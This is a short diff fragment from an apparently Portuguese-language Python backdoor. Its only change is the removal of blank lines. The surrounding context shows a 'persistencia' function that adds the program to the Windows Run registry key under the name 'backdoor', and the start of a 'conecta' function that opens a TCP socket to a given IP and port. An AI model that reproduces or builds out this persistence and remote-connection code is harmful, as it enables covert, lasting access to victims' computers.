@@ -26,8 +26,6 @@ def persistencia():
         FNULL = open(os.devnull,'w')
         subprocess.Popen("REG ADD HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\ /v backdoor /d " + TEMPDIR + "\\" + nome_arquivo, stdout=FNULL, sderr=FNULL)
 
-
-
 def conecta(IP, PORT):
     try:
         s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
